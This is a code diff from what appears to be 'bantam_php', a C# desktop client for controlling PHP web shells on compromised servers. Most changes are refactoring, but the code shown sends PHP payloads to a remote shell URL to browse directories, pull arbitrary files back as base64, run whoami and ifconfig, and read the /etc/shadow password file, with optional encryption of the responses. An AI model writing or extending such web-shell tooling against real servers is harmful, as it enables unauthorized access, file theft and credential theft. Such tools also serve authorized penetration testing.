@@ -930,9 +930,12 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            bool encryptResponse = Shells[shellUrl].responseEncryption;
-            string phpVersion = Shells[shellUrl].PHP_Version;
-            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+            ShellInfo shell = Shells[shellUrl];
+
+            bool encryptResponse = shell.responseEncryption;
+            string phpVersion = shell.PHP_Version;
+            int responseEncryptionMode = shell.responseEncryptionMode;
+
             string[] paths = txtBoxFileBrowserPath.Text.Split('/');
             string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);
 
@@ -943,33 +946,31 @@ namespace bantam_php
             string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
             ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
 
-            if (string.IsNullOrEmpty(shellUrl) == false) {
-                Shells[shellUrl].files.Nodes.Clear();
+            Shells[shellUrl].files.Nodes.Clear();
 
-                if (g_SelectedShellUrl == shellUrl) {
-                    treeViewFileBrowser.Nodes.Clear();
-                    treeViewFileBrowser.Refresh();
+            if (g_SelectedShellUrl == shellUrl) {
+                treeViewFileBrowser.Nodes.Clear();
+                treeViewFileBrowser.Refresh();
 
-                    txtBoxFileBrowserPath.Text = lastPathRemoved;
+                txtBoxFileBrowserPath.Text = lastPathRemoved;
 
-                    string path = txtBoxFileBrowserPath?.Text;
-                    if (string.IsNullOrEmpty(path)) {
-                        path = ".";
+                string path = txtBoxFileBrowserPath?.Text;
+                if (string.IsNullOrEmpty(path)) {
+                    path = ".";
+                }
+
+                if (response.Result != null && response.Result.Length > 0) {
+                    string result = response.Result;
+                    if (encryptResponse) {
+                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                     }
-
-                    if (response.Result != null && response.Result.Length > 0) {
-                        string result = response.Result;
-                        if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
-                        }
-                        if (!string.IsNullOrEmpty(result)) {
-                            FileBrowserRender(result, shellUrl);
-                        } else {
-                            //todo level 3 logging
-                        }
+                    if (!string.IsNullOrEmpty(result)) {
+                        FileBrowserRender(result, shellUrl);
                     } else {
                         //todo level 3 logging
                     }
+                } else {
+                    //todo level 3 logging
                 }
             }
         }
@@ -1162,6 +1163,7 @@ namespace bantam_php
             string shellUrl = g_SelectedShellUrl;
             string fileName = fileBrowserGetFileNameAndPath();
             bool encryptResponse = Shells[shellUrl].responseEncryption;
+
             string newFileName = GuiHelper.RenameFileDialog(fileName, "Renaming File");
 
             if (!string.IsNullOrEmpty(newFileName)) {
@@ -1293,6 +1295,43 @@ namespace bantam_php
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private async void downloadToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (validTarget() == false) {
+                return;
+            }
+
+            string shellUrl = g_SelectedShellUrl;
+            string fileName = fileBrowserGetFileName();
+            bool encryptResponse = Shells[shellUrl].responseEncryption;
+            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            SaveFileDialog downloadFileDialog = new SaveFileDialog {
+                RestoreDirectory = true
+            };
+
+            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
+                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
+                    string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
+                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+
+                    if (string.IsNullOrEmpty(response.Result) == false) {
+                        string result = response.Result;
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+                        }
+                        byte[] fileBytes = Helper.DecodeBase64(result);
+                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
+                    }
+                }
+            }
+        }
+
         #endregion
 
         #region OS_COMMANDS
@@ -1391,12 +1430,12 @@ namespace bantam_php
         private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
         {
             string shellUrl = g_SelectedShellUrl;
-            string cmd = PhpHelper.posixOS_Whoami;
-            bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
-            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+            ShellInfo shell = Shells[shellUrl];
 
-            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
+            string cmd = PhpHelper.posixOS_Whoami;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, shell.responseEncryption);
+
+            executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, shell.responseEncryption, shell.responseEncryptionMode);
         }
 
         /// <summary>
@@ -1409,8 +1448,9 @@ namespace bantam_php
             string shellUrl = g_SelectedShellUrl;
             string cmd = PhpHelper.linuxOS_Ifconfig;
             bool encrypt = Shells[shellUrl].responseEncryption;
-            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
             int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, cmd, encrypt, responseEncryptionMode);
         }
@@ -1512,43 +1552,6 @@ namespace bantam_php
             string phpCode = PhpHelper.ReadFile(PhpHelper.linuxFS_ShadowFile, encryptResponse);
 
             executePHPCodeDisplayInRichTextBox(shellUrl, phpCode, PhpHelper.linuxFS_ShadowFile, encryptResponse, responseEncryptionMode);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private async void downloadToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (validTarget() == false) {
-                return;
-            }
-
-            string shellUrl = g_SelectedShellUrl;
-            string fileName = fileBrowserGetFileName();
-            bool encryptResponse = Shells[shellUrl].responseEncryption;
-            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
-
-            SaveFileDialog downloadFileDialog = new SaveFileDialog {
-                RestoreDirectory = true
-            };
-
-            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
-                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
-                    string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
-                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
-
-                    if (string.IsNullOrEmpty(response.Result) == false) {
-                        string result = response.Result;
-                        if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
-                        }
-                        byte[] fileBytes = Helper.DecodeBase64(result);
-                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
-                    }
-                }
-            }
         }
 
         /// <summary>
